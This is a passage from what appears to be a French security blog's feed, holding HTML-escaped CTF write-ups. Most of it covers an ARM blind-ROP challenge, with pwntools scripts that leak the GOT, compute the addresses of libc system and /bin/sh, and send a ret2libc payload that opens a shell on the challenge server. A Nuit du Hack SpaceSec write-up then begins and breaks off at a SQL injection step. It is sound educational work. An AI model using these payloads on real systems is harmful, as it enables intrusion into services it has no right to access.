+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n\n\n&lt;/span&gt;&lt;span class="s2"&gt;Found at &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n\n\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si on trouve des caractères hexadécimaux dans l'output correspondant à l'instruction du gadget, on sait que c'est un &lt;code&gt;call puts&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[+] Opening connection to challenges.ecsc-teamfrance.fr on port 4006: Done
+
+Found at 24
+
+\xf0G\xbd\xe8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On peut maintenant leak tout le binaire mais au final, la seule chose qui nous intéresse c'est la GOT. &lt;/p&gt;
+&lt;p&gt;Celle-ci a une adresse ± fixe vers 0x21000±0x40.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="n"&gt;base_got&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x21000&lt;/span&gt;
+&lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;base_got&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;
+    &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x10604&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x1c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;dumb&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+        &lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;X&lt;/span&gt;&lt;span class="se"&gt;\xe9\x7f\xf6\xfc&lt;/span&gt;&lt;span class="s1"&gt;E~&lt;/span&gt;&lt;span class="se"&gt;\xf6\x94&lt;/span&gt;&lt;span class="s1"&gt;kn&lt;/span&gt;&lt;span class="se"&gt;\xf6\xe8\xc8&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6\x90&lt;/span&gt;&lt;span class="s1"&gt;Zt&lt;/span&gt;&lt;span class="se"&gt;\xf6\x8c\xc0&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6\xa4\xed&lt;/span&gt;&lt;span class="s1"&gt;p&lt;/span&gt;&lt;span class="se"&gt;\xf6\x90&lt;/span&gt;&lt;span class="s1"&gt;ct&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;|&lt;/span&gt;&lt;span class="se"&gt;\xe9&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;tUi&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;$Tq&lt;/span&gt;&lt;span class="se"&gt;\xf6\xc0\xe5&lt;/span&gt;&lt;span class="s1"&gt;p&lt;/span&gt;&lt;span class="se"&gt;\xf6\xf0\x04\x01\x00\xf0\x04\x01\x00\x08&lt;/span&gt;&lt;span class="s1"&gt;tl&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;d&lt;/span&gt;&lt;span class="se"&gt;\xba&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6\x80\x8e&lt;/span&gt;&lt;span class="s1"&gt;o&lt;/span&gt;&lt;span class="se"&gt;\xf6\xf0\x04\x01&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Libc + ret2libc&lt;/h2&gt;
+&lt;p&gt;La triche : ici, j'ai pris la libc de armory en supposant que c'était la même que sur le challenge, ça m'a évité d'avoir à tout leak à partir des adresses de la GOT (surtout avec la latence sur le serveur). &lt;/p&gt;
+&lt;p&gt;Il y a deux vraies méthodes pour leak la libc : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On utilise la même méthode que pour GOT en l'adaptant un peu (&lt;em&gt;printf&lt;/em&gt; va couper sur tous les "badchars" comme par exemple les sauts à la ligne) et on cherche la version de la libc dans les commentaires à la fin de la libc ;&lt;/li&gt;
+&lt;li&gt;On utilise &lt;a href="http://docs.pwntools.com/en/stable/dynelf.html"&gt;DynELF&lt;/a&gt; (merci au créateur du challenge "\J" pour la méthode) qui permet de résoudre les fonctions de la libc automatiquement avec juste une fonction de leak et une adresse du binaire. Dans ma méthode, j'utilise &lt;em&gt;printf&lt;/em&gt; pour leak et donc DynELF ne fonctionne pas. Il faudrait trouver un moyen de leak avec une autre fonction.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Avec la libc et nos adresses de la GOT, il ne nous reste plus qu'à calculer la différence entre &lt;em&gt;puts&lt;/em&gt; et &lt;em&gt;system&lt;/em&gt;, et &lt;em&gt;puts&lt;/em&gt; et &lt;em&gt;/bin/sh&lt;/em&gt; puis à set r0 à l'adresse de &lt;em&gt;/bin/sh&lt;/em&gt; et r3 à &lt;em&gt;system&lt;/em&gt; (on jump sur r3 à la fin de notre séquence de gadgets).&lt;/p&gt;
+&lt;p&gt;Pour faire ça, on teste toutes les adresses récupérées jusqu'à trouver la valeur de la GOT de &lt;em&gt;puts&lt;/em&gt; et on utilise pwntools pour calculer automatiquement l'adresse de &lt;em&gt;system&lt;/em&gt; et &lt;em&gt;/bin/sh&lt;/em&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;libc.so&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;X&lt;/span&gt;&lt;span class="se"&gt;\xe9\x7f\xf6\xfc&lt;/span&gt;&lt;span class="s1"&gt;E~&lt;/span&gt;&lt;span class="se"&gt;\xf6\x94&lt;/span&gt;&lt;span class="s1"&gt;kn&lt;/span&gt;&lt;span class="se"&gt;\xf6\xe8\xc8&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6\x90&lt;/span&gt;&lt;span class="s1"&gt;Zt&lt;/span&gt;&lt;span class="se"&gt;\xf6\x8c\xc0&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6\xa4\xed&lt;/span&gt;&lt;span class="s1"&gt;p&lt;/span&gt;&lt;span class="se"&gt;\xf6\x90&lt;/span&gt;&lt;span class="s1"&gt;ct&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;|&lt;/span&gt;&lt;span class="se"&gt;\xe9&lt;/span&gt;&lt;span class="s1"&gt;m&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;tUi&lt;/span&gt;&lt;span class="se"&gt;\xf6&lt;/span&gt;&lt;span class="s1"&gt;$Tq&lt;/span&gt;&lt;span class="se"&gt;\xf6\xc0\xe5&lt;/span&gt;&lt;span class="s1"&gt;p&lt;/span&gt;&lt;span class="se"&gt;\xf6\xf0\x04\x01&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;leak_got&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
+
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;leak&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;leak_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="n"&gt;leak_binsh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;leak_binsh&lt;/span&gt;
+    &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x1c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Et paf, on obtient un shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;x&lt;span class="o"&gt;]&lt;/span&gt; Opening connection to challenges.ecsc-teamfrance.fr on port &lt;span class="m"&gt;4006&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;x&lt;span class="o"&gt;]&lt;/span&gt; Opening connection to challenges.ecsc-teamfrance.fr on port &lt;span class="m"&gt;4006&lt;/span&gt;: Trying &lt;span class="m"&gt;51&lt;/span&gt;.91.16.154
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Opening connection to challenges.ecsc-teamfrance.fr on port &lt;span class="m"&gt;4006&lt;/span&gt;: Done
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Switching to interactive mode
+Welcome. Please enter your password:
+id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ctf&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ctf&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ctf&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/meterpreter.gif" alt="meterpreter" style="width: 40%;"/&gt;&lt;/p&gt;
+&lt;h2&gt;Retrospective&lt;/h2&gt;
+&lt;p&gt;Le challenge était vraiment super intéressant. Il ressemblait comme deux gouttes d'eaux à un BROP intel x64 avec le one gadget qui load tous les registres mais ça change de voir un peu d'ARM ! &lt;/p&gt;
+&lt;p&gt;L'année prochaine on veut du MIPS !&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à suivre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat. &lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="CTF"></category></entry><entry><title>Nuit du Hack Quals 2016 – SpaceSec – Write-Up</title><link href="https://test.dailysecurity.fr/write-up-ndh-quals-2016-spacesec" rel="alternate"></link><published>2016-04-04T09:08:00+02:00</published><updated>2016-04-04T09:08:00+02:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2016-04-04:/write-up-ndh-quals-2016-spacesec</id><summary type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons malheureusement pas réussi à nous qualifier.&lt;/p&gt;
+&lt;p&gt;Nous avons tout de même atteint la 11ème place (la place ingrate) ce qui est mieux que l'année précédente où après un rush infernal des autres équipes pendant la nuit nous avions finalement fini 28ème.&lt;/p&gt;
+&lt;p&gt;Comme chaque année le guessing était présent (la stéganographie principalement) mais cela ne m'a pas empêché de trouver des épreuves intéressantes comme l'épreuve de web que je vais vous présenter.&lt;/p&gt;
+&lt;h3&gt;SpaceSec 300 pts&lt;/h3&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec.png" alt="SpaceSec Challenge" style="width: 70%;"&gt;&lt;/p&gt;
+&lt;p&gt;La page est basique, un bon vieux challenge fait avec Bootstrap.&lt;/p&gt;
+&lt;p&gt;On remarque que tous les articles proposés contiennent les mêmes descriptions, seuls les numéros de CVE et les auteurs semblent changer.&lt;/p&gt;
+&lt;p&gt;En cliquant sur Older Post on obtient une adresse du type:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Si on change un peu l'offset on obtient :&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec-User-Flag.png" alt="SpaceSec Challenge User Flag" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Oh un utilisateur qui s'appelle Flag...&lt;/p&gt;
+&lt;p&gt;Soyons fou, tentons la SQL injection directement :&lt;/p&gt;
+&lt;blockquote&gt;
